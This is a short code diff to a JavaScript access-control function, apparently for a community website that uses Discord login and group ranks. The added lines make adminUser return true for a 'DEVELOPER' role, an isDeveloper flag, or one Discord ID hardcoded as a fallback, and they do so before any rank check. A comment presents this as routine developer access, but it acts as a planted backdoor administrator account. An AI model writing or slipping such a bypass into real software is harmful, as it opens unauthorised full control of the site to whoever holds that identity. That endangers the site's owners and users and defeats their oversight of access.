@@ -95,6 +95,8 @@ async function eligibility(user) {
   return { available:true, eligible:reasons.length===0, reasons, metRank:met.role && met.role.name, cidRank:cid.role && cid.role.name, divisions:{ primary:flp.member?['FLP']:[], secondary:[ia.member?'IA':null,hpc.member?'HPC':null].filter(Boolean) }, multiDivisionPermissions:multi };
 }
 async function adminUser(req) {
+  // Site developers retain full management access regardless of CID group rank.
+  if(req.user && (req.user.role === 'DEVELOPER' || req.user.isDeveloper === true || (req.user.discordId && req.user.discordId === (process.env.DEVELOPER_DISCORD_ID || '1227866745201627137')))) return true;
   try {
     const fresh=await require('../lib/accessControl').ensureFreshUser(req.user);
     if(fresh) req.user=fresh;
